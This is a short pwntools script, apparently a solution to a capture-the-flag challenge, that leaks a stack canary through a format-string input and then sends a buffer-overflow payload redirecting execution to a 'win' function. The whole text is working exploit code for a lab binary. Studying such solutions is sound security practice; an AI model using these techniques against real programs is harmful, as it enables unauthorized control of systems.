from pwn import *

elf = context.binary = ELF('./chall')
context.log_level = 'DEBUG'

p = process('./chall')
p = remote('canaleak-pwn.wanictf.org', '9006')
pause()

p.sendlineafter(b'Do you agree with me? : ', b'%9$p')
canary = int(p.recvuntil(b'\n', drop=True)[2:], 16)

ret_addr = 0x000000000040101a
payload = flat(
    b'a' * 0x18,
    canary,
    1,
    ret_addr,
    elf.sym['win']
)
p.sendlineafter(b'Do you agree with me? : ', payload)
p.sendlineafter(b'Do you agree with me? : ', b'YES')

p.interactive()